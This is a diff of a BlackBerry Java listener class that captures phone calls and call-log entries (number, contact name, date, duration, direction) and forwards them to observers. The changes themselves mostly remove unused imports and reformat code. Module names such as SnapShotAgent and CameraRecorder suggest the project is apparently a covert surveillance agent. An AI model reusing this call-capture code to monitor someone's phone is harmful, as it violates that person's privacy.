@@ -13,11 +13,6 @@ package blackberry;
 import java.util.Hashtable;
 import java.util.Vector;
 
-import javax.microedition.lcdui.Image;
-import javax.microedition.lcdui.ImageItem;
-
-import net.rim.blackberry.api.invoke.Invoke;
-import net.rim.blackberry.api.invoke.PhoneArguments;
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.blackberry.api.phone.PhoneCall;
 import net.rim.blackberry.api.phone.PhoneListener;
@@ -26,26 +21,11 @@ import net.rim.blackberry.api.phone.phonelogs.PhoneCallLog;
 import net.rim.blackberry.api.phone.phonelogs.PhoneCallLogID;
 import net.rim.blackberry.api.phone.phonelogs.PhoneLogListener;
 import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
-import net.rim.device.api.i18n.Locale;
-import net.rim.device.api.system.Alert;
-import net.rim.device.api.system.Application;
-import net.rim.device.api.system.Audio;
-import net.rim.device.api.system.Backlight;
-import net.rim.device.api.system.Bitmap;
 import net.rim.device.api.system.DeviceInfo;
-import net.rim.device.api.system.EventInjector;
 import net.rim.device.api.system.HolsterListener;
-import net.rim.device.api.system.KeypadListener;
 import net.rim.device.api.system.RadioStatusListener;
 import net.rim.device.api.system.SystemListener;
 import net.rim.device.api.system.SystemListener2;
-import net.rim.device.api.system.EventInjector.KeyCodeEvent;
-import net.rim.device.api.system.EventInjector.KeyEvent;
-import net.rim.device.api.ui.Keypad;
-import net.rim.device.api.ui.MenuItem;
-import net.rim.device.api.ui.UiApplication;
-import net.rim.device.api.ui.component.Menu;
-import blackberry.agent.SnapShotAgent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.fs.Path;
@@ -56,9 +36,7 @@ import blackberry.interfaces.CallListObserver;
 import blackberry.interfaces.Observer;
 import blackberry.interfaces.PhoneCallObserver;
 import blackberry.interfaces.Singleton;
-import blackberry.record.CameraRecorder;
 import blackberry.utils.Check;
-import blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -155,7 +133,7 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
             observers.removeElement(observer);
         } else {
             //#ifdef DEBUG
-            debug.error("removing observer not present: " + observer);
+            //debug.error("removing observer not present: " + observer);
             //#endif
         }
     }
@@ -696,7 +674,6 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
             outgoing = phoneCall.isOutgoing();
 
         } else {
-           
 
             synchronized (callingHistory) {
                 if (callingHistory.containsKey(new Integer(callId))) {
@@ -705,7 +682,7 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
                     callingHistory.remove(new Integer(callId));
                 }
             }
-            
+
             //#ifdef DEBUG_TRACE
             debug.trace("callDisconnected phoneNumber: " + phoneNumber);
             //#endif
@@ -743,36 +720,38 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
             debug.trace("date: " + callLog.getDate() + " number: "
                     + logID.getNumber());
             //#endif 
-            
-            int type= phoneCallLog.getType();
+
+            int type = phoneCallLog.getType();
             int status = callLog.getStatus();
-            
+
             String phoneNumber = "";
             String phoneName = null;
-            PhoneCallLogID partecipant =  phoneCallLog.getParticipant();
-            if(partecipant!=null){
-                phoneNumber=partecipant.getNumber();
-                phoneName= partecipant.getName();                
+            PhoneCallLogID partecipant = phoneCallLog.getParticipant();
+            if (partecipant != null) {
+                phoneNumber = partecipant.getNumber();
+                phoneName = partecipant.getName();
             }
-            
-            if(phoneName==null){
-                phoneName="";
+
+            if (phoneName == null) {
+                phoneName = "";
             }
-                
+
             //#ifdef DEBUG_INFO
-            debug.info("number: " + phoneNumber + " type: " + type + " status: "+status);
+            debug.info("number: " + phoneNumber + " type: " + type
+                    + " status: " + status);
             //#endif
-            
-            boolean outgoing=false;
-            boolean missed=false;
-            
-            if(type == PhoneCallLog.TYPE_PLACED_CALL){
-                outgoing = true;                
-            }else if(type == PhoneCallLog.TYPE_RECEIVED_CALL){
-                outgoing = false;                
+
+            boolean outgoing = false;
+            boolean missed = false;
+
+            if (type == PhoneCallLog.TYPE_PLACED_CALL) {
+                outgoing = true;
+            } else if (type == PhoneCallLog.TYPE_RECEIVED_CALL) {
+                outgoing = false;
             }
-            
-            if(type == PhoneCallLog.TYPE_MISSED_CALL_OPENED ||  type == PhoneCallLog.TYPE_MISSED_CALL_UNOPENED){
+
+            if (type == PhoneCallLog.TYPE_MISSED_CALL_OPENED
+                    || type == PhoneCallLog.TYPE_MISSED_CALL_UNOPENED) {
                 outgoing = true;
                 missed = true;
             }
@@ -786,9 +765,9 @@ public final class AppListener implements RadioStatusListener, HolsterListener,
                 debug.trace("notify: " + observer);
                 //#endif
 
-                observer.callLogAdded(
-                        phoneNumber, phoneName, callLog
-                                .getDate(), phoneCallLog.getDuration(), outgoing, missed);
+                observer.callLogAdded(phoneNumber, phoneName,
+                        callLog.getDate(), phoneCallLog.getDuration(),
+                        outgoing, missed);
 
             }
         }
